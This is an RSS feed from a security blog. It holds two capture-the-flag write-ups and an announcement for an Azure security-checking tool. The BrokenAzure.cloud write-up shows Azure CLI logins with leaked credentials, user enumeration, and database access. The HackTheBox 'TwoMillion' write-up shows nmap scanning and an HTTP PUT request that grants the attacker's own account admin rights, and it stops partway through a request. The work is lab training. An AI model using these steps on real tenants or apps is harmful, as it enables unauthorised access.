<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title></title>
        <link>undefined</link>
        <description>undefined</description>
        <lastBuildDate>Sat, 15 Feb 2025 17:28:10 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>Joplin Pages Publisher</generator>
        <item>
            <title><![CDATA[BrokenAzure.cloud - A series of CTFs on Azure]]></title>
            <guid>ebeabaed1fdb4b41b8ceb89e16d4477c</guid>
            <pubDate>Sat, 15 Feb 2025 17:02:56 GMT</pubDate>
            <content:encoded><![CDATA[<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a title="#introduction" href="#introduction">Introduction</a></li>
<li><a title="#examining-the-webpage-source-code" href="#examining-the-webpage-source-code">Examining the Webpage Source Code</a></li>
<li><a title="#looking-into-headerhtml" href="#looking-into-headerhtml">Looking into <code>/header.html</code></a></li>
<li><a title="#azure-container-image-source-url" href="#azure-container-image-source-url">Azure Container Image Source URL</a></li>
<li><a title="#flag-2" href="#flag-2">Flag 2</a></li>
<li><a title="#flag-3" href="#flag-3">Flag 3</a></li>
<li><a title="#flag-4" href="#flag-4">Flag 4</a></li>
<li><a title="#conclusion" href="#conclusion">Conclusion</a></li>
</ol>
<h2 id="introduction">Introduction</h2>
<p>Those are the first 4 challenges i took on <a title="https://www.brokenazure.cloud/" href="https://www.brokenazure.cloud/"><strong>BrokenAzure.cloud</strong></a></p>
<h2 id="examining-the-webpage-source-code">Examining the Webpage Source Code</h2>
<p>We examined the source code of the webpage that was presented to us:</p>
<div><pre class="hljs"><code><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"IE=edge"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"description"</span>
        <span class="hljs-attr">content</span>=<span class="hljs-string">"An online, open-source Azure CTF challenge called BrokenByDesign: Azure (BrokenAzure.cloud) that is running 24/7 created by Secura."</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Azure Security training | challenge 1<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"inject_html.js"</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"main.js"</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/style.css"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">include-html</span>=<span class="hljs-string">"/header.html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>
            What can I do with this app?
        <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>
            This app will test your hacking skills in the Azure cloud space.
        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>
            How do I submit flags?
        <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>
            All flags have the format <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>SECURA{CENSORED_FLAG}<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>.
        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>
            The Story
        <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>
            The company named SuperCompany B.V. has been working with IT systems for a while now and has an IT team of
            a whoppin' 2 people. Because the CEO of the company has heard that 'Cloud' is the new way of working, the CEO
            has asked the IT team to migrate all IT systems to the Azure cloud platform. Sadly, management does not allow
            the IT team to take courses or trainings to learn more about Azure cloud and so they have to learn as they go.
        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>
            Get started!
        <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"flag"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flag"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"submit-flag-input"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"Insert flag"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit flag"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"submit-flag-button"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"submit-flag-button"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>
            Need a hint? Click <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"hint1.html"</span>&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>!
        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">include-html</span>=<span class="hljs-string">"footer.html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div>
<h2 id="looking-into-headerhtml">Looking into <code>/header.html</code>.</h2>
<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://supercompanystorage.blob.core.windows.net/storagecontainer/logo.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"Broken By Design logo"</span>
    <span class="hljs-attr">class</span>=<span class="hljs-string">"bbd-logo"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"loadingFailed()"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bbg-challenge-name"</span>&gt;</span>
    Azure
<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"missing-challenges"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>&gt;</span>
    We have noticed that you did not submit the flags for CHALLENGES_HERE. Don't worry, this is not a problem, but feel
    free to submit THEM now anyway!
<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>
    CHALLENGE_NR HINT_NR
<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-comment">&lt;!-- This is a horrible solution, but this way we start checking for the missing challenges when the header is loaded --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">""</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"checkForMissing()"</span> /&gt;</span></code></pre></div>
<h2 id="azure-container-image-source-url">Azure Container Image Source URL</h2>
<p>We listed the container using the available APIs from Azure.<br />
Flag found:<br />
<img src="/_resources/1763ad9aa4d24e05a582b785421999da.png" /></p>
<h3 id="flag-2">Flag 2:</h3>
<p><img src="/_resources/93653e25cc38468aa468389e1e1aa418.png" /></p>
<p>We downloaded .pem and .ovpn files from the previous challenge container and used them to log into Azure.</p>
<div><pre class="hljs"><code>──(kali㉿kali)-[/home/kali]
└─PS&gt; az login --service-principal --username 8f2b67d8-<span class="hljs-number">6501</span>-4a47-9e6b-951363b2588a --tenant 4452edfd-a89d-43aa-<span class="hljs-number">8b46</span>-a314c219cc50 --password /tmp/SECURA{CENSORED_FLAG}.pem --allow-no-subscriptions
[
  {
    <span class="hljs-string">"cloudName"</span>: <span class="hljs-string">"AzureCloud"</span>,
    <span class="hljs-string">"id"</span>: <span class="hljs-string">"4452edfd-a89d-43aa-8b46-a314c219cc50"</span>,
    <span class="hljs-string">"isDefault"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"N/A(tenant level account)"</span>,
    <span class="hljs-string">"state"</span>: <span class="hljs-string">"Enabled"</span>,
    <span class="hljs-string">"tenantId"</span>: <span class="hljs-string">"4452edfd-a89d-43aa-8b46-a314c219cc50"</span>,
    <span class="hljs-string">"user"</span>:```json
    <span class="hljs-string">"user"</span>: {
      <span class="hljs-string">"name"</span>: <span class="hljs-string">"8f2b67d8-6501-4a47-9e6b-951363b2588a"</span>,
      <span class="hljs-string">"type"</span>: <span class="hljs-string">"servicePrincipal"</span>
    }
  }
]</code></pre></div>
<p>Once inside Azure, we started doing some enumeration and listing the users. We found the flag in the office location of the first user.</p>
<p><img src="/_resources/448d1161f33b430795533c56ee90e099.png" /></p>
<div><pre class="hljs"><code>┌──(kali㉿kali)-[/home/kali]
└─PS&gt; az ad user list                                                                                                          [                                                                                                                              
  {
    <span class="hljs-string">"businessPhones"</span>: [],
    <span class="hljs-string">"displayName"</span>: <span class="hljs-string">"DevOps"</span>,
    <span class="hljs-string">"givenName"</span>: null,
    <span class="hljs-string">"id"</span>: <span class="hljs-string">"022398e7-876f-4842-a598-706483ca4e98"</span>,
    <span class="hljs-string">"jobTitle"</span>: null,
    <span class="hljs-string">"mail"</span>: null,
    <span class="hljs-string">"mobilePhone"</span>: null,
    <span class="hljs-string">"officeLocation"</span>: <span class="hljs-string">"Password temp changed to SECURA{D4F4ULT_P4SSW0RD}"</span>,
    <span class="hljs-string">"preferredLanguage"</span>: null,
    <span class="hljs-string">"surname"</span>: null,
    <span class="hljs-string">"userPrincipalName"</span>: <span class="hljs-string">"devops@secvulnapp.onmicrosoft.com"</span>
  },
  {
    <span class="hljs-string">"businessPhones"</span>: [],
    <span class="hljs-string">"displayName"</span>: <span class="hljs-string">"Roy Stultiens | Secura"</span>,
    <span class="hljs-string">"givenName"</span>: null,
    <span class="hljs-string">"id"</span>: <span class="hljs-string">"8f54f6b2-1291-4791-85e7-163a72302888"</span>,
    <span class="hljs-string">"jobTitle"</span>: null,
    <span class="hljs-string">"mail"</span>: <span class="hljs-string">"roy.stultiens@secura.com"</span>,
    <span class="hljs-string">"mobilePhone"</span>: null,
    <span class="hljs-string">"officeLocation"</span>: null,
    <span class="hljs-string">"preferredLanguage"</span>: null,
    <span class="hljs-string">"surname"</span>: null,
    <span class="hljs-string">"userPrincipalName"</span>: <span class="hljs-string">"roy.stultiens_secura.com#EXT#@secvulnapp.onmicrosoft.com"</span>
  },
  {
    <span class="hljs-string">"businessPhones"</span>: [],
    <span class="hljs-string">"displayName"</span>: <span class="hljs-string">"Roy Stultiens"</span>,
    <span class="hljs-string">"givenName"</span>: null,
    <span class="hljs-string">"id"</span>: <span class="hljs-string">"41cfff23-c2c2-49c2-a8a9-abc0642dc8c5"</span>,
    <span class="hljs-string">"jobTitle"</span>: null,
    <span class="hljs-string">"mail"</span>: null,
    <span class="hljs-string">"mobilePhone"</span>: null,
    <span class="hljs-string">"officeLocation"</span>: null,
    <span class="hljs-string">"preferredLanguage"</span>: null, 
    
    [...]</code></pre></div>
<p>Flag found, with credentials to log in as the DevOps user.</p>
<h2 id="flag-3">Flag 3</h2>
<p>I logged into the Azure portal using the credentials found previously.</p>
<p><img src="/_resources/e6e8d2c11820447c9420f2f05bd6cd87.png" /></p>
<p>We started doing some enumeration on the cloud and found some function apps.</p>
<p><img src="/_resources/a325d45676ea4602a9388192396ddc03.png" /></p>
<p>We started reading the function app code:<br />
<img src="/_resources/834aa4dbe51c41ae96dd6d602b0bbd95.png" /></p>
<div><pre class="hljs"><code><span class="hljs-meta">#r "Newtonsoft.Json"</span>

<span class="hljs-keyword">using</span> System.Net;
<span class="hljs-keyword">using</span> Microsoft.AspNetCore.Mvc;
<span class="hljs-keyword">using</span> Microsoft.Extensions.Primitives;
<span class="hljs-keyword">using</span> Newtonsoft.Json;

<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> Task&lt;IActionResult&gt; <span class="hljs-title">Run</span>(<span class="hljs-params">HttpRequest req, ILogger log</span>)</span>
{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> OkObjectResult(<span class="hljs-string">"Server=tcp:securavulnerableserver.database.windows.net,1433;Initial Catalog=securavulnerabledb;Persist Security Info=False;User ID=DevOps;Password=SECURA{CENSORED_FLAG};MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"</span>);
}</code></pre></div>
<p>The flag is the password inside the connection string.</p>
<h2 id="flag-4">Flag 4</h2>
<p>We used the credentials previously found to connect to the database.</p>
<div><pre class="hljs"><code>┌──(root㉿kali)-[/home/kali]
└─<span class="hljs-comment"># sqlcmd -S securavulnerableserver.database.windows.net -d securavulnerabledb -U DevOps -P SECURA{CENSORED_FLAG};</span>
1&gt;</code></pre></div>
<p>We started wandering around the database:</p>
<p><img src="/_resources/f31ffb1daffe4cf68e90d69f443c81b1.png" /></p>
<div><pre class="hljs"><code>┌──(root㉿kali)-[/home/kali]
└─# sqlcmd -S securavulnerableserver.database.windows.net -d securavulnerabledb -U DevOps -P SECURA{CENSORED_FLAG};
<span class="hljs-meta">1&gt; </span>SELECT TABLE_NAME
<span class="hljs-meta">2&gt; </span>FROM INFORMATION_SCHEMA.TABLES
<span class="hljs-meta">3&gt; </span>WHERE TABLE_TYPE = <span class="hljs-string">'BASE TABLE'</span>;
<span class="hljs-meta">4&gt; </span>GO
TABLE_NAME                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
vpn_employee_data                                                                                                               

(<span class="hljs-number">1</span> row affected)
<span class="hljs-meta">1&gt; </span>Select * from vpn_employee_data;
<span class="hljs-meta">2&gt; </span>GO
vpn_username                                                                                                                                                                                                                                                    vpn_password                                                                                                                                                                                                                                                   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Employee23187                                                                                                                                                                                                                                                   SECURA{CENSORED_FLAG}                                                                                                                                                                                                                                        

(<span class="hljs-number">1</span> row affected)
<span class="hljs-number">1</span>&gt;</code></pre></div>
<p>Last Flag found.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In this write-up, we explored the first four challenges presented on the BrokenAzure.cloud platform. Each challenge required different techniques and methodologies to uncover the flags, demonstrating the importance of understanding Azure's security features and vulnerabilities.</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[AzureSecAnalyzer - A PowerShell project that checks the security settings of Azure resources.]]></title>
            <guid>9521f307308f48fe9979cebadc8f89af</guid>
            <pubDate>Sat, 15 Feb 2025 17:02:15 GMT</pubDate>
            <content:encoded><![CDATA[<p>I'm excited to announce that I've just published <a title="https://github.com/Giuslock/AzureSecAnalyzer" href="https://github.com/Giuslock/AzureSecAnalyzer"><strong>AzureSecAnalyzer</strong></a>, a PowerShell-based tool that checks the security settings of Azure resources. Whether you're managing a small-scale deployment or a multi-tenant environment, AzureSecAnalyzer provides comprehensive insights into the security configurations of your Azure resources and helps you identify potential vulnerabilities.</p>
<h3 id="what-is-azuresecanalyzer">What Is AzureSecAnalyzer?</h3>
<p>AzureSecAnalyzer is a versatile PowerShell project designed to analyze the security settings of various Azure resources, giving you a clear overview of how secure your environment is. The tool currently supports a wide range of Azure services, including:</p>
<ul>
<li>Analysis Services</li>
<li>App Services</li>
<li>Azure Cache for Redis</li>
<li>Cosmos DB</li>
<li>Disks</li>
<li>Event Hub Namespaces</li>
<li>Key Vaults</li>
<li>PostgreSQL (Flexible and Single Servers)</li>
<li>SQL Database and SQL Server</li>
<li>Storage Accounts</li>
</ul>
<p>AzureSecAnalyzer outputs the analysis results in an easy-to-read <code>.xlsx</code> file, making it simple to sort, filter, and interpret the data to improve your security posture.</p>
<h3 id="how-it-works">How It Works</h3>
<p>Once everything is set up, running AzureSecAnalyzer is straightforward. The tool offers different modes based on your needs:</p>
<ul>
<li><strong>Subscription mode:</strong> Analyze the entire Azure subscription.</li>
<li><strong>Resource Group mode:</strong> Focus on specific resource groups.</li>
<li><strong>Tenant mode:</strong> Analyze at the tenant level without additional input.</li>
</ul>
<p>The process is simple:</p>
<ol>
<li>Run the script <code>launch.ps1</code>.</li>
<li>Input the required details (subscription, resource group, etc.) into the <code>variables.txt</code> file.</li>
<li>The script will perform the analysis and generate a comprehensive <code>.xlsx</code> report.</li>
</ol>
<h3 id="output-format">Output Format</h3>
<p>The results are saved as an .xlsx file for easy analysis. You can quickly identify weak security settings and take the necessary actions to secure your environment.</p>
<h3 id="get-involved">Get Involved</h3>
<p>If you find AzureSecAnalyzer helpful or have ideas for improvements, contributions are welcome! Head over to the <a title="https://github.com/Giuslock/AzureSecAnalyzer" href="https://github.com/Giuslock/AzureSecAnalyzer">GitHub repository</a> to create a pull request or submit issues.</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CTF Report: 2Million]]></title>
            <guid>7deed476299845cd9460a54ecbe76f4c</guid>
            <pubDate>Sat, 15 Feb 2025 16:59:06 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="ctf-report-2million">CTF Report: 2Million</h1>
<p><img src="/_resources/0e0cdc5a31954e1f9684e83f8785e46f.png" /><br />
<a title="https://app.hackthebox.com/machines/TwoMillion" href="https://app.hackthebox.com/machines/TwoMillion">https://app.hackthebox.com/machines/TwoMillion</a></p>
<h2 id="initial-results-and-information">Initial Results and Information</h2>
<p>We started by performing an Nmap scan on the target machine:</p>
<div><pre class="hljs"><code>┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- 10.10.11.221      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-21 15:39 CEST
Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.221
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.97 seconds
We have two services running: SSH and a web server.</code></pre></div>
<p>We have two services running: SSH and a web server.</p>
<h2 id="enumeration-phase">Enumeration Phase</h2>
<h3 id="web-server-homepage">Web Server Homepage</h3>
<p><img src="/_resources/e69a8de843ea483381b69207ea40a0e6.png" /></p>
<h3 id="directory-enumeration">Directory Enumeration</h3>
<p><img src="/_resources/9720077350fd4964aba522d1bba48b30.png" /></p>
<h3 id="login-page">Login Page</h3>
<p><img src="/_resources/5e99bb976ff3475db6d7ff9848117903.png" /></p>
<h3 id="invite-code-page">Invite Code Page</h3>
<p><img src="/_resources/209d84e4da2d46dd99e102f96de47767.png" /></p>
<h3 id="javascript-for-invite-code">JavaScript for Invite Code</h3>
<p><img src="/_resources/980f84c29d5449b188f98886195625fc.png" /></p>
<div><pre class="hljs"><code><span class="hljs-built_in">eval</span>(
  <span class="hljs-keyword">function</span> (<span class="hljs-params">p, a, c, k, e, d</span>) {
    e = <span class="hljs-keyword">function</span> (<span class="hljs-params">c</span>) {
      <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)
    };
    <span class="hljs-keyword">if</span> (!<span class="hljs-string">''</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>, <span class="hljs-title class_">String</span>)) {
      <span class="hljs-keyword">while</span> (c--) {
        d[c.<span class="hljs-title function_">toString</span>(a)] = k[c] ||
        c.<span class="hljs-title function_">toString</span>(a)
      }
      k = [
        <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
          <span class="hljs-keyword">return</span> d[e]
        }
      ];
      e = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">'\\w+'</span>
      };
      c = <span class="hljs-number">1</span>
    };
    <span class="hljs-keyword">while</span> (c--) {
      <span class="hljs-keyword">if</span> (k[c]) {
        p = p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">'\\b'</span> + <span class="hljs-title function_">e</span>(c) + <span class="hljs-string">'\\b'</span>, <span class="hljs-string">'g'</span>), k[c])
      }
    }
    <span class="hljs-keyword">return</span> p
  }(
    <span class="hljs-string">'1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}'</span>,
    <span class="hljs-number">24</span>,
    <span class="hljs-number">24</span>,
    <span class="hljs-string">'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'|'</span>),
    <span class="hljs-number">0</span>,
    {
    }
  )
)</code></pre></div>
<h2 id="exploitation-phase">Exploitation Phase</h2>
<p>The JavaScript was deobfuscated as follows:</p>
<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verifyInviteCode</span><span class="hljs-params">(code)</span></span>{
    var formData = {<span class="hljs-string">"code"</span>: code};
    $.ajax({
        <span class="hljs-built_in">type</span>: <span class="hljs-string">"POST"</span>,
        dataType: <span class="hljs-string">"json"</span>,
        data: formData,
        url: <span class="hljs-string">'/api/v1/invite/verify'</span>,
        success: <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span>{
            console.<span class="hljs-built_in">log</span>(response);
        },
        <span class="hljs-built_in">error</span>: <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span>{
            console.<span class="hljs-built_in">log</span>(response);
        }
    });
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeInviteCode</span><span class="hljs-params">()</span></span>{
    $.ajax({
        <span class="hljs-built_in">type</span>: <span class="hljs-string">"POST"</span>,
        dataType: <span class="hljs-string">"json"</span>,
        url: <span class="hljs-string">'/api/v1/invite/generate'</span>,
        success: <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span>{
            console.<span class="hljs-built_in">log</span>(response);
        },
        <span class="hljs-built_in">error</span>: <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span>{
            console.<span class="hljs-built_in">log</span>(response);
        }
    });
}</code></pre></div>
<h3 id="generating-the-invite-code">Generating the Invite Code</h3>
<p>We performed a POST request to obtain the invite code:</p>
<p><img src="/_resources/926f1d6e56ea4f6b82ec37096ba2d809.png" /></p>
<p>Here it is in base64:<br />
<code>NUxMWjktMVdGS0ktWDMyMjctSUxBTkQ=</code></p>
<p>Using this code, we were able to register on the site:<br />
<img src="/_resources/7713918da80a4ff0817d7dc61d4abe28.png" /></p>
<h3 id="accessing-the-site">Accessing the Site</h3>
<p>With the credentials:</p>
<p>User: test<br />
Email: test@test.it<br />
Password: test</p>
<p><img src="/_resources/6be4579d1434444db2fff07fb81b6026.png" /></p>
<p>We successfully logged in:<br />
<img src="/_resources/b8083f367b6c479d9be4dc57ccb9fd92.png" /></p>
<h3 id="api-exploration">API Exploration</h3>
<p>We found an API list within the web pages:<br />
<img src="/_resources/d8919b9bd2254afd8da877075cd12349.png" /></p>
<h3 id="modifying-admin-settings">Modifying Admin Settings</h3>
<p>We attempted to modify the admin settings with the following payload:</p>
<p><img src="/_resources/0b13d1ff786241e49df4b4f64e9608a2.png" /></p>
<div><pre class="hljs"><code><span class="hljs-keyword">PUT</span> <span class="hljs-string">/api/v1/admin/settings/update</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>2million.htb
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=0at92ian3f6vu79iq3p3vjt6gc
<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json

<span class="language-perl">{<span class="hljs-string">"email"</span>:<span class="hljs-string">"test@test.it"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"test"</span>,<span class="hljs-string">"is_admin"</span>:<span class="hljs-number">1</span>}</span></code></pre></div>
<div><pre class="hljs"><code><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK
<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx
<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sun, 21 Jul 2024 14:55:58 GMT
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>Thu, 19 Nov 1981 08:52:00 GMT
<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-store, no-cache, must-revalidate
<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>40

<span class="language-json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-number">13</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"is_admin"</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">}</span></span></code></pre></div>
<hr />
<h3 id="confirmation-of-the-change">Confirmation of the change:</h3>
<p><img src="/_resources/037c1dae5039405bbd8157f3476c3a22.png" /></p>
<h3 id="verifying-admin-authentication">Verifying Admin Authentication</h3>
<p>We performed a request to verify admin privileges:</p>
<div><pre class="hljs"><code><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/v1/admin/auth</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>2million.htb
